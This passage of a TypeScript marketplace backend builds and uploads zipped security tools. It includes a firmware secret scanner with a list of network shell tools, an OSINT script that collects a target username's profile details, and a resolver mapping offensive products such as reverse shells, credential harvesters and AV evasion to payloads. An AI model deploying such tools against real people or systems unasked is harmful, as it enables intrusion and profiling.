dns_tunnel_sim(args.domain or 'c2.lab.local')\n    elif args.mode == 'https-beacon': https_beacon_sim(args.url or 'https://lab.example.com', args.interval)\n`,
    },

    // ── FirmwareX — IoT Firmware Analysis Toolkit ────────────────────────────────
    "firmware-x": {
      "README.md": `# FirmwareX — IoT Firmware Analysis Toolkit\n\nExtract, analyse, and find vulnerabilities in IoT firmware images.\n\n\`\`\`bash\npip install -r requirements.txt\npython3 firmware_x.py --image firmware.bin --output firmware_report.json\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing and educational use only. Authors accept no liability for misuse.\n`,
      "firmware_x.py": `#!/usr/bin/env python3\nimport argparse, json, re, os, subprocess\nfrom pathlib import Path\nfrom datetime import datetime\n\nSECRET_PATTERNS = [\n    (rb'(?i)password[\\s=:]+([^\\x00-\\x1f\\x7f-\\xff]{6,})', 'Hardcoded password'),\n    (rb'(?i)admin[\\s=:]+([^\\x00-\\x1f\\x7f-\\xff]{4,})', 'Admin credential'),\n    (rb'BEGIN (RSA|EC) PRIVATE KEY', 'Private key'),\n    (rb'ssh-rsa AAAA[A-Za-z0-9+/]+', 'SSH public key (check for matching private key)'),\n    (rb'(?i)(api[_-]?key|access[_-]?token)[\\s=:]+[A-Za-z0-9_\\-]{10,}', 'API key/token'),\n    (rb'192\\.168\\.[0-9]+\\.[0-9]+|10\\.[0-9]+\\.[0-9]+\\.[0-9]+|172\\.(1[6-9]|2[0-9]|3[01])\\.[0-9]+\\.[0-9]+', 'Private IP address'),\n    (rb'-----BEGIN CERTIFICATE-----', 'Embedded certificate'),\n]\n\nSUSPECT_BINARIES = ['telnetd', 'busybox', 'dropbear', 'openssl', 'curl', 'wget', 'nc', 'netcat']\n\ndef analyse_binary(data: bytes) -> dict:\n    findings = []\n    for pattern, desc in SECRET_PATTERNS:\n        matches = re.findall(pattern, data)\n        if matches: findings.append({'type': desc, 'count': len(matches), 'severity': 'HIGH' if 'password' in desc.lower() or 'key' in desc.lower() else 'MEDIUM'})\n    # Check for common vulnerable versions\n    version_patterns = [\n        (rb'OpenSSL ([0-9]+\\.[0-9]+\\.[0-9]+[a-z]?)', 'OpenSSL version'),\n        (rb'BusyBox v([0-9]+\\.[0-9]+\\.[0-9]+)', 'BusyBox version'),\n        (rb'Linux version ([0-9]+\\.[0-9]+\\.[0-9]+)', 'Linux kernel version'),\n    ]\n    versions = {}\n    for pat, name in version_patterns:\n        m = re.search(pat, data)\n        if m: versions[name] = m.group(1).decode('utf-8', errors='ignore')\n    # Find embedded strings\n    strings = [m.decode('utf-8', errors='ignore') for m in re.findall(rb'[\\x20-\\x7e]{6,}', data)][:50]\n    return {'findings': findings, 'versions': versions, 'string_count': len(strings), 'suspicious_strings': [s for s in strings if any(k in s.lower() for k in ['telnet','default','admin','root','pass'])][:10]}\n\ndef try_extract_fs(image_path: str, output_dir: str) -> bool:\n    try:\n        result = subprocess.run(['binwalk', '-e', '-M', '-C', output_dir, image_path], capture_output=True, text=True, timeout=120)\n        return result.returncode == 0\n    except FileNotFoundError:\n        print('[!] binwalk not found — install: sudo apt-get install binwalk')\n        return False\n    except: return False\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--image', required=True)\n    ap.add_argument('--output', default='firmware_report.json')\n    ap.add_argument('--extract', action='store_true')\n    args = ap.parse_args()\n    print(f'[*] FirmwareX analysing: {args.image}')\n    with open(args.image, 'rb') as f: data = f.read()\n    print(f'[*] Image size: {len(data):,} bytes')\n    analysis = analyse_binary(data)\n    extracted = False\n    if args.extract:\n        out_dir = args.image + '_extracted'\n        extracted = try_extract_fs(args.image, out_dir)\n    report = {'image': args.image, 'size': len(data), 'timestamp': datetime.now().isoformat(),\n              'analysis': analysis, 'filesystem_extracted': extracted}\n    with open(args.output, 'w') as f: json.dump(report, f, indent=2)\n    print(f'[+] Findings: {len(analysis["findings"])}')\n    for f in analysis['findings']: print(f'  [{f["severity"]}] {f["type"]} ({f["count"]} occurrences)')\n    if analysis['versions']: print(f'[+] Versions: {analysis["versions"]}')\n`,
      "requirements.txt": `binwalk>=2.3.0\n`,
    },

    // ── Social Media OSINT Framework ─────────────────────────────────────────────
    "social-osint": {
      "README.md": `# Social Media OSINT Framework\n\nPassive open-source intelligence gathering across social platforms.\n\n\`\`\`bash\npython3 social_osint.py --username target_handle --platforms twitter,github,linkedin\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing and educational use only. Authors accept no liability for misuse.\n`,
      "social_osint.py": `#!/usr/bin/env python3\nimport argparse, requests, json\nfrom datetime import datetime\n\ndef check_github(username: str) -> dict:\n    try:\n        r = requests.get(f'https://api.github.com/users/{username}', timeout=10)\n        if r.status_code == 404: return {'found': False}\n        data = r.json()\n        repos_r = requests.get(f'https://api.github.com/users/{username}/repos?per_page=10', timeout=10)\n        repos = [{'name': r['name'], 'lang': r['language'], 'stars': r['stargazers_count']} for r in repos_r.json()]\n        return {'found': True, 'name': data.get('name'), 'bio': data.get('bio'), 'location': data.get('location'),\n                'company': data.get('company'), 'email': data.get('email'), 'public_repos': data.get('public_repos'),\n                'created_at': data.get('created_at'), 'repos': repos}\n    except Exception as e: return {'error': str(e)}\n\ndef check_twitter(username: str, bearer_token: str = None) -> dict:\n    if not bearer_token: return {'note': 'Twitter API v2 bearer token required'}\n    try:\n        r = requests.get(f'https://api.twitter.com/2/users/by/username/{username}?user.fields=description,location,public_metrics,created_at',\n                         headers={'Authorization': f'Bearer {bearer_token}'}, timeout=10)\n        if r.status_code != 200: return {'found': False, 'status': r.status_code}\n        data = r.json().get('data', {})\n        return {'found': True, **data}\n    except Exception as e: return {'error': str(e)}\n\ndef check_reddit(username: str) -> dict:\n    try:\n        r = requests.get(f'https://www.reddit.com/user/{username}/about.json',\n                         headers={'User-Agent': 'OSINT-Tool/1.0'}, timeout=10)\n        if r.status_code == 404: return {'found': False}\n        data = r.json().get('data', {})\n        return {'found': True, 'karma': data.get('total_karma'), 'created': data.get('created_utc'),\n                'is_gold': data.get('is_gold'), 'verified': data.get('verified')}\n    except Exception as e: return {'error': str(e)}\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--username', required=True)\n    ap.add_argument('--platforms', default='github,reddit')\n    ap.add_argument('--twitter-bearer')\n    ap.add_argument('--output', default='osint_report.json')\n    args = ap.parse_args()\n    print(f'[*] Social Media OSINT — target: {args.username}')\n    print('[*] PASSIVE OSINT — public information only')\n    platforms = [p.strip() for p in args.platforms.split(',')]\n    results = {'username': args.username, 'timestamp': datetime.now().isoformat(), 'platforms': {}}\n    if 'github' in platforms: results['platforms']['github'] = check_github(args.username)\n    if 'twitter' in platforms: results['platforms']['twitter'] = check_twitter(args.username, args.twitter_bearer)\n    if 'reddit' in platforms: results['platforms']['reddit'] = check_reddit(args.username)\n    with open(args.output, 'w') as f: json.dump(results, f, indent=2)\n    found = [p for p, d in results['platforms'].items() if d.get('found')]\n    print(f'[+] Found on: {found}')\n    print(f'[+] Report: {args.output}')\n`,
      "requirements.txt": `requests>=2.31.0\n`,
    },

  
};

// ─── Zip Builder ──────────────────────────────────────────────────────────────

async function buildZip(files: Record<string, string>): Promise<Buffer> {
  const zip = new JSZip();
  for (const [name, content] of Object.entries(files)) {
    zip.file(name, content);
  }
  const result = await zip.generateAsync({ type: "nodebuffer" as any, compression: "DEFLATE" });
  return result as unknown as Buffer;
}

// ─── Payload Key Resolver ─────────────────────────────────────────────────────

function resolvePayloadKey(title: string): string | null {
  const t = title.toLowerCase();
  if (t.includes("reverse shell"))                return "reverse-shell";
  if (t.includes("web vulnerability") || t.includes("vuln scan")) return "vuln-scanner";
  if (t.includes("osint"))                        return "osint-toolkit";
  if (t.includes("privilege escalation") && t.includes("linux")) return "privesc-toolkit";
  if (t.includes("sql injection"))                return "sql-injection";
  if (t.includes("xss") || t.includes("cross-site scripting"))  return "xss-hunter";
  if (t.includes("port scan") || t.includes("network recon"))   return "port-scanner";
  if (t.includes("wifi") || t.includes("wi-fi") || t.includes("wireless")) return "wifi-pentest";
  if (t.includes("waf bypass"))                   return "waf-bypass";
  if (t.includes("crypto arbitrage"))             return "crypto-arbitrage";
  if (t.includes("ai chatbot") || t.includes("chatbot framework")) return "ai-chatbot";
  if (t.includes("smart contract"))               return "smart-contract";
  if (t.includes("seo automation") || t.includes("seo suite"))  return "seo-automation";
  if (t.includes("email campaign"))               return "email-campaign";
  if (t.includes("api security"))                 return "api-security";
  if (t.includes("iam") || t.includes("privilege escalation") && t.includes("cloud")) return "cloud-iam-scanner";
  if (t.includes("fine-tun") || t.includes("finetune") || t.includes("llm")) return "llm-finetune";
  if (t.includes("encrypt") || t.includes("e2e") || t.includes("end-to-end")) return "e2e-encryption";
  if (t.includes("docker") || t.includes("container escape"))   return "docker-scanner";
  if (t.includes("malware") || t.includes("sandbox"))           return "malware-sandbox";
  if (t.includes("password"))                     return "password-analyzer";
  if (t.includes("ransomware"))                   return "ransomware-defense";
  if (t.includes("phishing"))                     return "phishing-sim";
  if (t.includes("network traffic") || t.includes("pcap"))      return "network-analyzer";
  if (t.includes("kill switch"))                  return "kill-switch";

    // ── Extended key mappings — all 82 products covered ──────────────────────────
    if (t.includes("credential harvester") || t.includes("titan credential")) return "credential-harvester";
    if (t.includes("ai vulnerability") || t.includes("vulnerability scanner agent")) return "ai-vuln-scanner";
    if (t.includes("bug bounty"))                return "bug-bounty-hunter";
    if (t.includes("zero-day") || t.includes("zero day exploit")) return "zero-day-edu";
    if (t.includes("subdomain"))                 return "subdomain-scanner";
    if (t.includes("breach database") || t.includes("credential breach")) return "breach-database";
    if (t.includes("react dashboard"))           return "react-dashboard";
    if (t.includes("rate limit") || t.includes("rate limiter")) return "api-rate-limiter";
    if (t.includes("saas boilerplate") || t.includes("full-stack saas")) return "saas-boilerplate";
    if (t.includes("prompt engineering"))        return "prompt-engineering";
    if (t.includes("phishing detection") || t.includes("phishing ml")) return "phishing-dataset";
    if (t.includes("infrastructure-as-code") || t.includes("iac") || t.includes("terraform")) return "iac-scanner";
    if (t.includes("kubernetes") || t.includes("k8s"))  return "k8s-dashboard";
    if (t.includes("ci/cd") || t.includes("github actions") || t.includes("cicd")) return "cicd-templates";
    if (t.includes("wallet tracker") || t.includes("crypto wallet")) return "wallet-tracker";
    if (t.includes("titan builder"))             return "titan-builder";
    if (t.includes("titan security hardening") || t.includes("security hardening pack")) return "titan-security-pack";
    if (t.includes("titan chat") || t.includes("chat plugin sdk")) return "titan-chat-sdk";
    if (t.includes("titan analytics"))           return "titan-analytics";
    if (t.includes("white-label") || t.includes("whitelabel")) return "titan-whitelabel";
    if (t.includes("next.js") || t.includes("nextjs") || t.includes("e-commerce starter")) return "nextjs-ecommerce";
    if (t.includes("siem") || t.includes("log analysis"))       return "siem-lite";
    if (t.includes("jwt") || t.includes("authentication library")) return "jwt-hardened";
    if (t.includes("blockchain") || t.includes("transaction monitor")) return "blockchain-monitor";
    if (t.includes("ssl") || t.includes("tls certificate"))     return "ssl-analyzer";
    if (t.includes("http security header") || t.includes("header audit")) return "header-auditor";
    if (t.includes("dns recon") || t.includes("dns reconnaissance")) return "dns-recon";
    if (t.includes("password manager") || t.includes("password manager core")) return "password-manager";
    if (t.includes("secure file sharing"))       return "secure-file-sharing";
    if (t.includes("red team c2") || t.includes("command and control")) return "c2-framework";
    if (t.includes("threat intelligence"))       return "threat-intel";
    if (t.includes("active directory"))          return "active-directory";
    if (t.includes("enterprise penetration") || t.includes("pentest framework")) return "pentest-framework";
    if (t.includes("zero trust"))                return "zero-trust";
    if (t.includes("compliance") || t.includes("soc2") || t.includes("gdpr") || t.includes("iso27001")) return "compliance-automation";
    if (t.includes("mitm") || t.includes("man-in-the-middle") || t.includes("network sniff")) return "mitm-toolkit";
    if (t.includes("obfuscat") || t.includes("av evasion") || t.includes("evasion engine")) return "av-evasion";
    if (t.includes("buffer overflow"))           return "buffer-overflow-lab";
    if (t.includes("cryptograph") && (t.includes("attack") || t.includes("suite"))) return "crypto-attacks";
    if (t.includes("honeynet") || t.includes("honeypot") || t.includes("deception grid")) return "honeynet";
    if (t.includes("reconai") || t.includes("recon ai") || t.includes("attack surface")) return "recon-ai";
    if (t.includes("browserpwn") || t.includes("in-browser") || t.includes("browser exploit")) return "browser-pwn";
    if (t.includes("maldna") || t.includes("malware behaviour") || t.includes("fingerprint")) return "mal-dna";
    if (t.includes("ai code review") || t.includes("code review agent")) return "ai-code-review";
    if (t.includes("secureci") || t.includes("security gate") || t.includes("pull request security")) return "secure-ci";
    if (t.includes("threatmodel") || t.includes("threat model") || t.includes("threat modelling")) return "threat-model";
    if (t.includes("packetpoison") || t.includes("packet poison") || t.includes("network attack sim")) return "packet-poison";
    if (t.includes("apifuzz") || t.includes("api fuzz") || t.includes("graphql") && t.includes("fuzz")) return "api-fuzz";
    if (t.includes("deobfuscat") || t.includes("deobfuscator"))  return "deobfuscator";
    if (t.includes("credsniper") || t.includes("cred sniper") || t.includes("password spray") || t.includes("stuffing lab")) return "cred-sniper";
    if (t.includes("ransomsim") || t.includes("ransomware sim") || t.includes("ransomware behaviour sim")) return "ransomware-sim";
    if (t.includes("supply chain") || t.includes("supplychain") || t.includes("dependency risk")) return "supply-chain";
    if (t.includes("ghosttraffic") || t.includes("ghost traffic") || t.includes("encrypted c2")) return "ghost-traffic";
    if (t.includes("firmwarex") || t.includes("firmware") || t.includes("iot firmware")) return "firmware-x";
    if (t.includes("social media osint") || t.includes("social osint")) return "social-osint";
    // ── Gap-fill: 7 MODULE_CATALOG titles with specific patterns ──────────────────
    if (t.includes("packet analyzer") || t.includes("network packet"))    return "network-analyzer";
    if (t.includes("seo") && (t.includes("keyword") || t.includes("research"))) return "seo-automation";
    if (t.includes("defi") || (t.includes("arbitrage") && !t.includes("crypto"))) return "crypto-arbitrage";
    if (t.includes("chatbot") && (t.includes("support") || t.includes("blueprint"))) return "ai-chatbot";
    if (t.includes("container") && (t.includes("detection") || t.includes("prevention"))) return "docker-scanner";
    if (t.includes("vaultaudit") || (t.includes("vault") && t.includes("audit"))) return "secure-ci";
    if (t.includes("supply") && t.includes("chain"))                      return "supply-chain";
    return null;
}

// ─── Generic Fallback Payload ─────────────────────────────────────────────────

function buildGenericPayload(title: string, description: string, language: string): Record<string, string> {
  const ext = language.toLowerCase().includes("python") ? "py"
            : language.toLowerCase().includes("typescript") || language.toLowerCase().includes("javascript") ? "ts"
            : language.toLowerCase().includes("go") ? "go"
            : language.toLowerCase().includes("rust") ? "rs"
            : "sh";
  const mainFile = `main.${ext}`;
  return {
    "README.md": `# ${title}\n\n${description}\n\n## Installation\n\`\`\`bash\npip install -r requirements.txt\n\`\`\`\n\n## Usage\n\`\`\`bash\npython3 ${mainFile} --help\n\`\`\`\n`,
    [mainFile]: `# ${title}\n# ${description}\n\nprint("Module loaded: ${title}")\n`,
    "requirements.txt": "# Add dependencies here\n",
    "LICENSE": "MIT License\nCopyright (c) 2025 Archibald Titan Marketplace\n",
  };
}

// ─── Main Export ──────────────────────────────────────────────────────────────

export async function generateAndUploadPayload(listingId: number): Promise<string | null> {
  const db = await getDb();
  if (!db) return null;

  const [listing] = await db
    .select()
    .from(marketplaceListings)
    .where(eq(marketplaceListings.id, listingId))
    .limit(1);

  if (!listing) return null;

  const key = resolvePayloadKey(listing.title);
  const files = key && PAYLOADS[key]
    ? PAYLOADS[key]
    : buildGenericPayload(listing.title, listing.description, listing.language || "Python");

  const zipBuffer = await buildZip(files);
  const storageKey = `marketplace/payloads/${listing.uid}.zip`;

  try {
    await storagePut(storageKey, zipBuffer, "application/zip");
    await db
      .update(marketplaceListings)
      .set({ fileUrl: storageKey })
      .where(eq(marketplaceListings.id, listingId));
    return storageKey;
  } catch (err) {
    log.error("[PayloadGen] Upload failed:", { error: err });
    return null;
  }
}

export async function generateAllMissingPayloads(): Promise<{ generated: number; failed: number }> {
  const db = await getDb();
  if (!db) return { generated: 0, failed: 0 };

  const listings = await db
    .select()
    .from(marketplaceListings)
    .where(isNull(marketplaceListings.fileUrl));

  let generated = 0, failed = 0;
  for (const listing of listings) {
    const result = await generateAndUploadPayload(listing.id);
    if (result) generated++;
    else failed++;
  }
  return { generated, failed };
}
